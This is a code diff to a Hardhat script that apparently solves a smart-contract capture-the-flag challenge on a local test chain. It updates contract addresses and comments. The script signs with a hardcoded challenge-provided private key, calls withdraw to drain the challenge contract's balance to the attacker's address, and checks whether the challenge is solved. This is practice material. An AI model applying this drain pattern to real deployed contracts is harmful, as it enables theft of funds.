@@ -1,8 +1,9 @@
 const { ethers } = require('hardhat')
 
+// Given by the challenge
 const jsonRpcUrl = 'http://127.0.0.1:8545'
-const setupAddress = '0x8A791620dd6260079BF849Dc5567aDC3F2FdC318'
-const challengeAddress = '0x8aCd85898458400f7Db866d53FCFF6f0D49741FF'
+const setupAddress = '0x5FbDB2315678afecb367f032d93F642f64180aa3'
+const challengeAddress = '0xa16E02E87b7454126E5E10d957A927A7F5B5d2be'
 const signerPrivateKey = '0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3'
 
 const fetchBalance = async contractOrSigner => {
@@ -23,7 +24,7 @@ async function main() {
    // Connect to the given blockchain
    const provider = new ethers.providers.JsonRpcProvider(jsonRpcUrl)
 
-   // The signer is the given EOA which we need to use to sign any transaction
+   // The signer is the given EOA which we need to use to sign any transactions
    // needed to perform the attack (because it has the ETH to pay for fees).
    const signer = new ethers.Wallet(signerPrivateKey, provider)
 
@@ -35,7 +36,7 @@ async function main() {
    await challengeInstance.withdraw(signer.address)
    await printBalances('After', signer, challengeInstance)
 
-   // Call the `isSolved` function of the Setup contract
+   // Call the `isSolved` function of the Setup contract.
    const setupInstance = (await ethers.getContractAt('Setup', setupAddress)).connect(signer)
    console.log('Is solved:', await setupInstance.isSolved())
 }
